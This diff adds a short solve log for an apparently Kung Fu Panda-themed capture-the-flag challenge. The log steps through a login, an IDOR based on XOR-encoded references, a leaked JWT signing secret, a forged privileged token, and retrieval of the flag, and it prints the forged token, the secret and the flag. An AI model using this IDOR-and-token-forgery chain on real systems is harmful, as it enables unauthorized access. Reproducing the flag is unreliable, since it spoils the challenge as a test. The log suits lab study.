@@ -1,0 +1,14 @@
+[1] login as po / skadoosh1
+    (200, {'message': 'Welcome back, Disciple.', 'rank': 'trainee'})
+[2] training-ref IDOR:  XOR('po') = 1a0e  (== built-in ref 1a0e)
+    shifu file -> Dragon Warrior Certification (RESTRICTED)
+[3] Oogway leaks signing phrase
+    49c0c971bede5a3ccd988f8cf820e0378bbb64bb19e67f42
+[4] forge dragon-warrior seal
+    seal = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0N2MwNzk4Zi03MWJmLTQ0ODYtYTZjMy1hNmZiMzE1ZWNmZjgiLCJyYW5rIjoiZHJhZ29uLXdhcnJpb3IiLCJpYXQiOjE3OTE2ODg1MDIsImV4cCI6MTc5MTc3NDkwMiwiaXNzIjoiamFkZS1wYWxhY2UifQ.4K_75-KDP7TXVBnVJhYkxxQzt2LP9wAvPke5E6tJW2k
+[5] certify seal
+    (200, {'message': 'Master Shifu has recognized your Dragon Seal.', 'rank': 'dragon-warrior', 'dragon_scroll_chamber': 'open'})
+[6] GET /api/scroll
+    {'flag': 'KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}'}
+
+FLAG: KPMG_CTF{o_-ODQ02brB5QsTNAdKsWH7FSvp99ue50bXlSRGd2JOj}
